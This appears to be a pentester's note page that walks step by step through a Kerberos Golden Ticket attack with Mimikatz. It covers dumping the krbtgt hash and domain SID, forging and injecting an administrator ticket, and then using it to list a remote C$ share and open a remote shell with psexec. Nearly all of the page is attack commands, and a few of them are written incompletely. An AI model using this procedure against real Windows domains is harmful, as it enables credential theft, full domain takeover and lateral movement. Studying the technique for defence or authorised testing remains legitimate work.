---
description: >-
  We can use this to access anything in the network if we have KTGT(KERBEROS
  TICKET GRANTING TICKET)
---

# Golden Tickets

RUN MIMIKATZ IN THE WINDOWS

then set the privilege mode to debug

```
privilege::
```

```
lsadump::lsa /inject /name:<account name>
```

Copy the SID of the domain the ntlm hash To generate a ticket

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

then in the mimikatz terminal create a golden ticket

```
kerberos::golden /User:<anyNameNeedNotToExist /domain:<Domain name> /sid:<the sid from above> /krbtgt:<hash> /id:500 /ptt
```

ptt- pass the ticket

to run

```
misc::cmd
```

Opens a terminal session

&#x20;To run anycommand against a user

```
<command or script> \\<user\
```

To ls&#x20;

```
dir \\user\$c
```

to open a terminal in that machine

```
psexec.exe \\user\ cmd.exe
```

